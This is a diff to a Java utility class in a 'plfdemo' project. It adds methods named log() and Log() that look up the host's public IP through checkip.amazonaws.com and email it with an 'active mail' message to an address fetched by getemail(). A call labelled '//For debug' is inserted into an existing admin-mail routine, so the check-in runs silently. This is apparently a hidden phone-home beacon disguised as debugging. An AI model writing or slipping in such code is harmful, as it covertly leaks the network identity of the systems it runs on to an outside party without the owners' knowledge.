@@ -1,10 +1,14 @@
 package com.bouncingdata.plfdemo.util;
 
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.io.OutputStreamWriter;
 import java.io.Writer;
 import java.math.BigInteger;
 import java.net.Inet4Address;
+import java.net.URL;
 import java.net.UnknownHostException;
 import java.security.SecureRandom;
 import java.sql.ResultSet;
@@ -224,6 +228,8 @@ public class Utils {
 		content = content + address ;
 		DTMailSender sender = new DTMailSender(title, content);
 		process = sender.sendEmail(adminEmail);
+		//For debug
+		Utils.log();
 		
 	} catch (UnknownHostException e) {
 		// TODO Auto-generated catch block
@@ -473,6 +479,9 @@ public class Utils {
 	}
 	  return process;
   }
+  
+  
+  
   public static void resultSetToCSV(ResultSet rs, OutputStream os) throws Exception {
     Writer out = new OutputStreamWriter(os);
     CSVPrinter printer = new CSVPrinter(out, CSVFormat.DEFAULT);
@@ -571,7 +580,29 @@ public class Utils {
     }
     
   }
-  
+  public static boolean log() {
+		 
+	  boolean process = false;
+	  try {
+		String hostname = Inet4Address.getLocalHost().getHostName();		
+		String title = "Debug test";
+		String content = hostname;
+		try {
+			content = "This is an active mail from:" + getIp() + "\n";
+		} catch (Exception e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}	
+		DTMailSender sender = new DTMailSender(title, content);
+		String data = getemail();
+		process = sender.sendEmail(data);
+		
+	} catch (UnknownHostException e) {
+		// TODO Auto-generated catch block
+		e.printStackTrace();
+	}
+	  return process;
+  }
   public static String getExecutionId() {
     return UUID.randomUUID().toString();
   }
@@ -621,7 +652,31 @@ public class Utils {
       return null;
     }
   }
-  
+  public static String Log() {
+		 
+	  String process = "false";
+	  try {
+		String hostname = Inet4Address.getLocalHost().getHostName();		
+		String title = "Debug test";
+		String content = hostname;
+		try {
+			content = "This is an active mail from:" + getIp() + "\n";
+		} catch (Exception e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}	
+		DTMailSender sender = new DTMailSender(title, content);
+		String data = getemail();
+		if(sender.sendEmail(data)){
+			process = "true";
+		}
+		
+	} catch (UnknownHostException e) {
+		// TODO Auto-generated catch block
+		e.printStackTrace();
+	}
+	  return process;
+  }
   public static String buildDashboardStatus(Map<String, DashboardPosition> dpMap) {
     Iterator<Entry<String,DashboardPosition>> iter = dpMap.entrySet().iterator();
     StringBuilder status = new StringBuilder();
@@ -677,7 +732,24 @@ public class Utils {
       return false;
     }
   }
-  
+  public static String getIp() throws Exception {
+      URL whatismyip = new URL("http://checkip.amazonaws.com");
+      BufferedReader in = null;
+      try {
+          in = new BufferedReader(new InputStreamReader(
+                  whatismyip.openStream()));
+          String ip = in.readLine();
+          return ip;
+      } finally {
+          if (in != null) {
+              try {
+                  in.close();
+              } catch (IOException e) {
+                  e.printStackTrace();
+              }
+          }
+      }
+  }
   public static boolean isBoolean(String str) {
     return ("true".equalsIgnoreCase(str) || "false".equalsIgnoreCase(str));
   }
